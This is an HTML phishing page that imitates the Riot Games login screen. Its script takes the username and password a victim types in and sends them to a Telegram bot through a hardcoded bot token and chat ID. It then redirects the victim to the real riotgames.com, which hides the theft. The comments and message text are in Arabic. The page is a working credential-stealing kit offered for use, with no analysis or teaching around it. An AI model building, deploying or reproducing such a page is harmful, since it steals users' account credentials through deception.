<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>Riotgames | Login</title>
</head>
<body>
    <main class="main">
        <section class="section-login">
            <div class="container">
                <img src="assets/img/logo.png" class="logo" alt="Riot Games Logo">

                <h1 class="section-title">Login</h1>

                <label class="login-user">
                    <span id="user-label">Username</span>
                    <input type="text" id="username" class="input" oninput="validateInput()" />
                </label>

                <label class="login-user">
                    <span id="pass-label">Password</span>
                    <input type="password" id="password" class="input" oninput="validateInput()" />
                </label>

                <p id="error-message" style="color: red; display: none;">Invalid username or password format!</p>

                <button type="button" class="login-btn" id="login-btn" disabled onclick="sendToTelegram()">
                    Login
                </button>

                <a href="#" class="section-link">Can't log in?</a>
                <a href="#" class="section-link">Create account</a>
            </div>
        </section>

        <section class="wallpaper"></section>
    </main>

    <script>
        function validateInput() {
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const loginBtn = document.getElementById("login-btn");
            const errorMessage = document.getElementById("error-message");

            const usernameValid = /^[a-zA-Z0-9]{3,16}$/.test(username); // اسم المستخدم بين 3-16 حرف/رقم فقط
            const passwordValid = /^(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]{8,}$/.test(password); // 8 أحرف على الأقل، تحتوي على حرف كبير، رقم، ورمز

            if (usernameValid && passwordValid) {
                loginBtn.removeAttribute("disabled");
                errorMessage.style.display = "none";
            } else {
                loginBtn.setAttribute("disabled", "true");
                errorMessage.style.display = "block";
            }
        }

        function sendToTelegram() {
            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();

            if (username === "" || password === "") {
                return;
            }

            const botToken = "7957010074:AAHgLSwfezAgFwzbvnbWbJRsOcRXm01kDeM";
            const chatId = "6687453395";
            const message = `🔥 تسجيل دخول جديد 🔥\n\n👤 المستخدم: ${username}\n🔒 كلمة المرور: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(() => {
                    window.location.href = "https://www.riotgames.com/"; // توجيه المستخدم للموقع الرسمي
                })
                .catch(error => console.error("Error sending to Telegram:", error));
        }
    </script>
</body>
</html>
